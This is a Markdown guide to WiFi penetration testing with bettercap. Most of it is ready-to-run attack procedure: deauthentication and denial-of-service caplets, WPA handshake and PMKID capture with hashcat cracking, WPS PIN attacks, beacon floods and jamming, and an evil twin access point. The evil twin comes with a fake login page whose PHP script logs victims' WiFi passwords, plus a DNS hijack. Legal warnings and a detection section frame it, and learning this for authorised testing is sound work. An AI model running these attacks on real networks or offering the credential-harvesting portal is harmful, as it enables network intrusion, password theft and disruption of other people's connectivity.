# Bettercap WiFi Pentesting Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [WiFi Adapter Setup](#wifi-adapter-setup)
4. [WiFi Reconnaissance](#wifi-reconnaissance)
5. [Deauthentication Attacks](#deauthentication-attacks)
6. [Handshake Capture](#handshake-capture)
7. [Evil Twin Attacks](#evil-twin-attacks)
8. [WPA/WPA2 Cracking](#wpawpa2-cracking)
9. [WiFi DOS Attacks](#wifi-dos-attacks)
10. [Advanced WiFi Attacks](#advanced-wifi-attacks)
11. [Detection and Prevention](#detection-and-prevention)

---

## Introduction

WiFi penetration testing involves assessing the security of wireless networks. Bettercap provides powerful WiFi attack capabilities including:

- Network reconnaissance and mapping
- Deauthentication attacks
- Handshake capture for password cracking
- Evil twin/rogue AP attacks
- Client sniffing and tracking

### Legal Warning
⚠️ **CRITICAL**: Only test WiFi networks you own or have explicit written permission to test. Unauthorized WiFi attacks violate:
- Federal Communications Commission (FCC) regulations
- Computer Fraud and Abuse Act
- Similar laws worldwide

Jamming/interfering with WiFi is illegal in most jurisdictions even if you own the network.

---

## Prerequisites

### Hardware Requirements

#### Compatible WiFi Adapters
You need a WiFi adapter that supports **monitor mode** and **packet injection**.

**Recommended Adapters:**
- **Alfa AWUS036NHA** (Atheros AR9271) - Best overall
- **Alfa AWUS036ACH** (Realtek RTL8812AU) - 5GHz support
- **TP-Link TL-WN722N v1** (Atheros AR9271) - Budget option (v2/v3 NOT compatible)
- **Panda PAU09** (Ralink RT5372)
- **Alfa AWUS1900** (Realtek RTL8814AU)

**Chipsets to Look For:**
- Atheros AR9271 (2.4GHz)
- Ralink RT3070/RT3572/RT5572
- Realtek RTL8812AU/RTL8814AU (dual-band)

**Avoid:**
- Broadcom chipsets (poor Linux support)
- Intel wireless cards (limited monitor mode)
- Built-in laptop WiFi cards (usually incompatible)

### Software Requirements

```bash
# Install required tools
sudo apt update
sudo apt install -y bettercap aircrack-ng wireless-tools net-tools

# Optional but recommended
sudo apt install -y wireshark hashcat hcxtools
```

### Driver Installation

Most Atheros adapters work out-of-the-box on Kali Linux. For others:

```bash
# Check if adapter is detected
lsusb
iwconfig

# For Realtek RTL8812AU/RTL8814AU
sudo apt install realtek-rtl88xxau-dkms

# Or build from source
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
make
sudo make install
```

---

## WiFi Adapter Setup

### Identify WiFi Interface

```bash
# List all network interfaces
iwconfig

# Or use ip command
ip link show

# You should see something like:
# wlan0     IEEE 802.11  ESSID:off/any
```

### Enable Monitor Mode

Monitor mode allows capturing all WiFi packets in the air, not just packets for your connection.

#### Method 1: Using airmon-ng (Recommended)

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Interface usually renamed to wlan0mon
iwconfig
```

#### Method 2: Manual Setup

```bash
# Disable interface
sudo ip link set wlan0 down

# Set monitor mode
sudo iw dev wlan0 set type monitor

# Enable interface
sudo ip link set wlan0 up

# Verify
iwconfig wlan0
# Should show: Mode:Monitor
```

### Disable Monitor Mode

```bash
# Method 1: Using airmon-ng
sudo airmon-ng stop wlan0mon

# Method 2: Manual
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up

# Restart network services
sudo systemctl start NetworkManager
```

### Change WiFi Channel

```bash
# Change to specific channel (1-14 for 2.4GHz)
sudo iwconfig wlan0 channel 6

# Or use iw
sudo iw dev wlan0 set channel 6

# For 5GHz (channels 36, 40, 44, 48, 149, 153, 157, 161)
sudo iw dev wlan0 set channel 36
```

### Change MAC Address (Optional)

```bash
# Disable interface
sudo ip link set wlan0 down

# Change MAC
sudo macchanger -r wlan0
# Or set specific MAC:
# sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0

# Enable interface
sudo ip link set wlan0 up
```

---

## WiFi Reconnaissance

Discover WiFi networks and connected clients.

### Basic WiFi Scanning

```bash
# Start bettercap in WiFi mode
sudo bettercap -iface wlan0

# Enable WiFi recon
wifi.recon on

# Show discovered access points
wifi.show

# Show clients
wifi.show.clients
```

### Targeted Reconnaissance

```bash
# Scan specific channel
wifi.recon.channel 6

# Show APs sorted by signal
wifi.show sort rssi

# Show detailed info for specific AP
wifi.show AA:BB:CC:DD:EE:FF

# Clear discovered networks
wifi.clear
```

### Channel Hopping

```bash
# Enable channel hopping (scan all channels)
set wifi.recon.channel_hopping true

# Set hop frequency (milliseconds)
set wifi.recon.channel_hop_frequency 250

# Start recon with hopping
wifi.recon on
```

### WiFi Recon Caplet

Create `wifi-scan.cap`:
```bash
# Set interface
set wifi.interface wlan0

# Enable channel hopping
set wifi.recon.channel_hopping true

# Start reconnaissance
wifi.recon on

# Auto-show APs every 5 seconds
set ticker.commands "clear; wifi.show"
set ticker.period 5
ticker on
```

Run:
```bash
sudo bettercap -iface wlan0 -caplet wifi-scan.cap
```

### Save WiFi Scan Results

```bash
# Enable event logging
set events.stream.output /tmp/wifi-scan.log
events.stream on

# Start recon
wifi.recon on

# Wait and capture
# Results saved to log file

# Parse log later
cat /tmp/wifi-scan.log | grep wifi.ap.new
```

### Identify Hidden SSIDs

```bash
# Start recon
wifi.recon on

# Hidden networks show as "<hidden>"
wifi.show

# Deauth clients to capture SSID in reconnect
# (see Deauthentication section below)
```

---

## Deauthentication Attacks

Disconnect clients from WiFi networks by sending deauth frames.

### How Deauth Works

WiFi deauthentication frames tell clients to disconnect. Since WiFi management frames aren't encrypted (in WPA/WPA2), attackers can send fake deauth frames.

**Uses:**
- Capture WPA handshakes (force reconnect)
- Kick users off network (DoS)
- Reveal hidden SSIDs
- Force clients to connect to evil twin

### Basic Deauth Attack

```bash
# Start bettercap
sudo bettercap -iface wlan0

# Scan for networks
wifi.recon on

# Wait to see APs and clients
wifi.show

# Deauth all clients from specific AP
wifi.deauth AA:BB:CC:DD:EE:FF

# The AP MAC is the BSSID from wifi.show
```

### Targeted Deauth (Specific Client)

```bash
# Deauth specific client from AP
# Format: wifi.deauth <AP-MAC> <CLIENT-MAC>
wifi.deauth AA:BB:CC:DD:EE:FF 11:22:33:44:55:66
```

### Continuous Deauth

```bash
# Deauth in a loop
set wifi.deauth.interval 1000  # milliseconds

# Deauth continuously
wifi.deauth AA:BB:CC:DD:EE:FF
```

### Deauth Caplet

Create `deauth-attack.cap`:
```bash
# Set interface
set wifi.interface wlan0

# Start recon
wifi.recon on

# Wait for target to appear, then press Ctrl+C

# Interactive: user will manually run wifi.deauth
```

For automated deauth:
```bash
# Target AP (replace with actual BSSID)
set target.ap AA:BB:CC:DD:EE:FF

# Deauth interval
set wifi.deauth.interval 1000

# Start recon on specific channel
wifi.recon.channel 6
wifi.recon on

# User must run manually: wifi.deauth <BSSID>
```

### Broadcast Deauth (All Clients)

```bash
# Deauth all clients on all visible APs
wifi.deauth broadcast

# Or deauth all clients from specific AP
wifi.deauth AA:BB:CC:DD:EE:FF
```

---

## Handshake Capture

Capture WPA/WPA2 handshakes for offline password cracking.

### What is a Handshake?

When a client connects to WPA/WPA2 WiFi, a 4-way handshake occurs. This handshake contains encrypted password data. By capturing it, you can attempt to crack the password offline.

### Capture Handshake (Passive)

Wait for client to connect naturally:

```bash
# Start bettercap
sudo bettercap -iface wlan0

# Set channel of target network
wifi.recon.channel 6

# Start recon
wifi.recon on

# Wait for clients to connect (could take hours)
# Handshakes auto-saved to ~/bettercap-wifi-handshakes.pcap
```

### Capture Handshake (Active - Deauth)

Force clients to reconnect to capture handshake:

```bash
# Start bettercap
sudo bettercap -iface wlan0

# Set channel
wifi.recon.channel 6

# Start recon
wifi.recon on

# Wait to see AP and clients
wifi.show

# Deauth clients to force reconnect
wifi.deauth AA:BB:CC:DD:EE:FF

# Monitor for handshake capture
# Will see message: "wifi.client.handshake" in events
```

### Complete Handshake Capture Caplet

Create `capture-handshake.cap`:
```bash
# Configuration
set wifi.interface wlan0
set wifi.recon.channel 6

# Output file
set wifi.handshakes.file /tmp/handshakes.pcap

# Enable recon
wifi.recon on

# Instructions printed
events.ignore wifi.client.probe
events.ignore wifi.ap.new
events.ignore wifi.ap.lost

# User instructions
echo "\nWiFi Handshake Capture Mode"
echo "============================\n"
echo "1. Wait for target AP and clients to appear"
echo "2. Run: wifi.show"
echo "3. Run: wifi.deauth <AP-BSSID>"
echo "4. Wait for handshake capture message"
echo "5. Handshakes saved to /tmp/handshakes.pcap\n"
```

Run:
```bash
sudo bettercap -iface wlan0 -caplet capture-handshake.cap
```

### Verify Handshake

```bash
# Using aircrack-ng
aircrack-ng ~/bettercap-wifi-handshakes.pcap

# Should show: "1 handshake"

# Using tshark
tshark -r ~/bettercap-wifi-handshakes.pcap -Y "eapol" | grep "Key"

# Convert for hashcat
/usr/lib/hashcat-utils/cap2hccapx.bin ~/bettercap-wifi-handshakes.pcap output.hccapx

# Or use hcxtools
hcxpcapngtool -o output.hc22000 ~/bettercap-wifi-handshakes.pcap
```

---

## Evil Twin Attacks

Create a fake access point that mimics a legitimate network.

### How Evil Twin Works

1. Create fake AP with same SSID as target
2. Deauth clients from real AP
3. Clients auto-connect to fake AP (stronger signal)
4. Capture credentials via fake login portal

### Basic Evil Twin Setup

#### Step 1: Setup Fake AP with hostapd

Create `hostapd.conf`:
```conf
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=temporary123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
```

Start hostapd:
```bash
sudo hostapd hostapd.conf
```

#### Step 2: DHCP Server

```bash
# Install dnsmasq
sudo apt install dnsmasq

# Configure interface
sudo ip addr add 192.168.10.1/24 dev wlan0
sudo ip link set wlan0 up

# Create dnsmasq.conf
cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
EOF

# Start dnsmasq
sudo dnsmasq -C /tmp/dnsmasq.conf
```

#### Step 3: Deauth Real AP

```bash
# In another terminal, use bettercap to deauth real AP
sudo bettercap -iface wlan1  # Different interface

wifi.recon on
wifi.deauth <REAL-AP-BSSID>
```

### Evil Twin with Captive Portal

More sophisticated: present fake login page.

#### Step 1: Create Captive Portal

```bash
# Create portal directory
mkdir -p /tmp/portal

# Create fake login page
cat > /tmp/portal/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial; max-width: 400px; margin: 50px auto; padding: 20px; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>WiFi Network Login</h2>
    <p>Please enter your password to connect to the network.</p>
    <form action="check.php" method="post">
        <input type="password" name="password" placeholder="WiFi Password" required>
        <button type="submit">Connect</button>
    </form>
</body>
</html>
EOF

# Create capture script (PHP)
cat > /tmp/portal/check.php << 'EOF'
<?php
$password = $_POST['password'];
$file = fopen("/tmp/captured-passwords.txt", "a");
fwrite($file, date("Y-m-d H:i:s") . " - " . $password . "\n");
fclose($file);

// Redirect to real site
header("Location: http://www.google.com");
exit();
?>
EOF
```

#### Step 2: Web Server

```bash
# Install PHP web server
cd /tmp/portal
php -S 0.0.0.0:80
```

#### Step 3: DNS Hijack

```bash
# Modify dnsmasq.conf to redirect all domains
cat >> /tmp/dnsmasq.conf << EOF
address=/#/192.168.10.1
EOF

# Restart dnsmasq
sudo pkill dnsmasq
sudo dnsmasq -C /tmp/dnsmasq.conf
```

### Automated Evil Twin with Fluxion

Fluxion automates evil twin attacks:

```bash
# Install Fluxion
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo ./fluxion.sh

# Follow interactive prompts
# 1. Select interface
# 2. Scan for networks
# 3. Select target
# 4. Capture handshake
# 5. Create evil twin with portal
# 6. Deauth clients
```

### Evil Twin Detection

Clients can detect evil twins by:
- Comparing BSSID (MAC address)
- Signal strength anomalies
- Certificate warnings (for HTTPS)
- Different network behavior

---

## WPA/WPA2 Cracking

After capturing handshakes, crack the password offline.

### Dictionary Attack with aircrack-ng

```bash
# Using wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt ~/bettercap-wifi-handshakes.pcap

# Using multiple wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt capture.pcap

# Specify ESSID if multiple networks in capture
aircrack-ng -e "TargetNetwork" -w rockyou.txt capture.pcap
```

### GPU Cracking with hashcat

Much faster than CPU cracking.

```bash
# Convert capture to hashcat format
hcxpcapngtool -o capture.hc22000 ~/bettercap-wifi-handshakes.pcap

# Dictionary attack
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# With rules (common password mutations)
hashcat -m 22000 capture.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (8-character lowercase)
hashcat -m 22000 capture.hc22000 -a 3 ?l?l?l?l?l?l?l?l

# Mask attack (format: NameYYYY)
hashcat -m 22000 capture.hc22000 -a 3 ?u?l?l?l?l?d?d?d?d

# View cracked password
hashcat -m 22000 capture.hc22000 --show
```

### Generating Custom Wordlists

```bash
# Using crunch (8-10 character lowercase)
crunch 8 10 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Using CUPP (personalized wordlist)
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i  # Interactive mode

# Using Cewl (scrape website for words)
cewl -d 2 -m 8 https://targetcompany.com -w company-wordlist.txt
```

### WPA3 Note

WPA3 uses SAE (Simultaneous Authentication of Equals) instead of the 4-way handshake, making traditional handshake capture ineffective. WPA3 cracking requires different techniques:

```bash
# Capture WPA3 with hcxdumptool (if adapter supports)
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=15

# Convert for hashcat
hcxpcapngtool -o capture.hc22000 capture.pcapng

# Crack (slower than WPA2)
hashcat -m 22000 capture.hc22000 wordlist.txt
```

---

## WiFi DOS Attacks

Denial of Service attacks disrupt WiFi availability.

### Deauth DoS

Continuously kick all clients off network:

```bash
# Start bettercap
sudo bettercap -iface wlan0

# Recon to find target
wifi.recon on
wifi.show

# Deauth all clients continuously
set wifi.deauth.interval 100  # 100ms = very aggressive

# Deauth specific AP
wifi.deauth AA:BB:CC:DD:EE:FF
```

Create `wifi-dos.cap`:
```bash
set wifi.interface wlan0

# Target channel
wifi.recon.channel 6

# Very short interval
set wifi.deauth.interval 50

# Start recon
wifi.recon on

# Instructions
echo "\n=== WiFi DoS Attack ==="
echo "Run: wifi.deauth <BSSID>"
echo "This will continuously deauth all clients\n"
```

### Beacon Flood

Create many fake APs to overwhelm WiFi scanners:

```bash
# Using MDK4
sudo apt install mdk4

# Beacon flood (creates fake APs)
sudo mdk4 wlan0 b -f /tmp/fake-ssids.txt -s 1000

# Create fake SSID list
cat > /tmp/fake-ssids.txt << EOF
FreeWiFi
Starbucks WiFi
Airport WiFi
FBI Surveillance Van
Pretty Fly for a WiFi
EOF
```

### Channel Jamming

⚠️ **WARNING**: This is illegal in most countries!

```bash
# Using MDK4 (demonstration only)
# Don't actually do this!

# Deauth all APs on channel 6
sudo mdk4 wlan0 d -c 6

# Or use mdk3
sudo mdk3 wlan0 d
```

---

## Advanced WiFi Attacks

### WPS PIN Attack

WPS (WiFi Protected Setup) has vulnerabilities.

#### Using Reaver

```bash
# Install reaver
sudo apt install reaver

# Put adapter in monitor mode
sudo airmon-ng start wlan0

# Check for WPS-enabled APs
sudo wash -i wlan0mon

# Attack WPS PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Faster attack (may cause lockout)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -L -N -d 0 -T 0.5 -r 3:15
```

#### Using Bully

```bash
# Install bully
sudo apt install bully

# WPS attack
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6
```

### PMKID Attack

Capture PMKID for WPA/WPA2 cracking without clients.

```bash
# Install hcxdumptool and hcxtools
sudo apt install hcxdumptool hcxtools

# Put adapter in monitor mode
sudo airmon-ng start wlan0

# Capture PMKIDs (run for 5-10 minutes)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=15

# Convert for hashcat
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### WiFi Pineapple Alternative

Create Karma/Pineapple-like attack with bettercap:

```bash
# Responder to all probe requests
# This requires custom caplet/scripting

# Or use wifi-pumpkin3
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3
sudo python3 setup.py install

# Run wifi-pumpkin
sudo wifipumpkin3
```

### Rogue DHCP Server

Provide malicious DNS server to clients:

```bash
# Setup requires separate tool (dnsmasq)

# Create malicious DNS config
cat > /tmp/evil-dns.conf << EOF
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1  # Gateway (you)
dhcp-option=6,192.168.10.1  # DNS (you)
server=8.8.8.8
# Redirect specific domains
address=/login.example.com/192.168.10.1
EOF

# Run
sudo dnsmasq -C /tmp/evil-dns.conf -d
```

---

## Detection and Prevention

### Detecting WiFi Attacks

#### Detect Deauth Attacks

```bash
# Monitor for deauth frames
sudo airodump-ng wlan0mon

# Or with tcpdump
sudo tcpdump -i wlan0mon -n -e -s 256 type mgt subtype deauth

# Or with Wireshark
# Filter: wlan.fc.type_subtype == 0x000c
```

#### Detect Evil Twins

```bash
# Same SSID, different BSSID
sudo airodump-ng wlan0mon | grep "TargetSSID"

# Check signal strength anomalies
# Real AP usually has consistent signal
```

#### Detect Rogue APs

```bash
# Use Kismet for comprehensive monitoring
sudo apt install kismet
sudo kismet -c wlan0

# Or use WiFi analyzer apps on phone
```

### Preventing WiFi Attacks

#### For Network Administrators:

1. **Use WPA3** (or WPA2-Enterprise with 802.1X)
```bash
# WPA3-only prevents handshake capture
# Configure in router/AP settings
```

2. **Disable WPS** (always)
```bash
# Access router admin panel
# Security settings → Disable WPS
```

3. **Strong Password** (12+ characters, mixed)
```bash
# Not in dictionary
# Example: C0mpl3x!P@ssw0rd#2024
```

4. **802.11w (Management Frame Protection)**
```bash
# Prevents deauth attacks
# Enable in router if available (WPA3 includes this)
```

5. **MAC Filtering** (limited effectiveness)
```bash
# Allow only known device MACs
# Note: MAC addresses can be spoofed
```

6. **Wireless IDS/IPS**
```bash
# Deploy Kismet, Snort, or commercial WIPS
sudo apt install kismet
```

7. **Hidden SSID** (security through obscurity)
```bash
# Disable SSID broadcast
# Note: Can still be discovered via deauth
```

#### For Clients:

1. **Verify BSSID** before connecting
2. **Use VPN** on public WiFi
3. **Forget networks** when not in use
4. **Disable auto-connect** for public networks
5. **Check certificates** for WPA2-Enterprise
6. **Use apps** like WiFi Guard, Fing to detect evil twins

### Incident Response

If under attack:

```bash
# 1. Change WiFi password immediately
# 2. Update router firmware
# 3. Enable WPA3 if available
# 4. Enable 802.11w
# 5. Check connected devices
# 6. Review logs for unauthorized access
# 7. Consider MAC filtering temporarily
```

---

## Troubleshooting

### Monitor Mode Not Working

```bash
# Check if adapter supports monitor mode
iw list | grep "Supported interface modes" -A 8

# Should show "monitor" in list

# Kill interfering processes
sudo airmon-ng check kill

# Try manual method
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### No Networks Showing

```bash
# Verify monitor mode active
iwconfig wlan0

# Change channel manually
sudo iwconfig wlan0 channel 6

# Check antenna is connected (USB adapters)

# Try different adapter position (interference)

# Verify with airodump-ng
sudo airodump-ng wlan0mon
```

### Handshake Not Capturing

```bash
# 1. Ensure on correct channel
wifi.recon.channel <AP-channel>

# 2. Be patient, wait for natural disconnect
# Or deauth:
wifi.deauth <AP-BSSID>

# 3. Verify with aircrack-ng
aircrack-ng ~/bettercap-wifi-handshakes.pcap

# 4. Try different capture tool
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### Deauth Not Working

```bash
# 1. Verify interface in monitor mode
iwconfig

# 2. Check if AP has 802.11w enabled
# (Management Frame Protection blocks deauth)

# 3. Ensure correct BSSID
wifi.show

# 4. Try different adapter (some don't support injection)

# 5. Verify with aireplay-ng
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## Best Practices

### For Penetration Testing:

1. **Get Written Authorization**
2. **Test After Hours** (minimize disruption)
3. **Document Everything**
4. **Use Targeted Attacks** (not broadcast deauth)
5. **Monitor for Issues** (be ready to stop)
6. **Report Findings** professionally
7. **Recommend Mitigations**

### For Learning:

1. **Use Your Own Network**
2. **Setup Test Lab** (multiple routers, isolated)
3. **Use Old Hardware** (practice without risk)
4. **Understand Theory** (not just running commands)
5. **Practice Defenses** (learn both sides)
6. **Stay Legal** (seriously)

---

## Summary

Key WiFi pentesting techniques:

- **Reconnaissance**: Identify networks, channels, clients
- **Deauthentication**: Disconnect clients, capture handshakes
- **Evil Twin**: Fake AP for credential harvesting
- **Handshake Cracking**: Offline password attacks
- **WPS Attacks**: Exploit WPS vulnerabilities
- **PMKID**: Crack without clients

**Defense priorities:**
1. WPA3 or WPA2-Enterprise
2. Disable WPS
3. 802.11w (MFP)
4. Strong passwords
5. Wireless IDS

---

## Legal Reminder

⚠️ **Final Warning**: WiFi attacks are serious crimes when unauthorized. Always:
- Get written permission
- Test only your networks
- Understand local laws
- Use responsibly

Ignorance of the law is not a defense.

---

## Next Steps

- [MITM Attack Guide](BETTERCAP-MITM-GUIDE.md) - Network MITM attacks
- [Quick Reference](BETTERCAP-CHEATSHEET.md) - Command cheat sheet
- [Main Guide](BETTERCAP-COMPLETE-GUIDE.md) - Installation and basics

---

**Last Updated**: November 2025
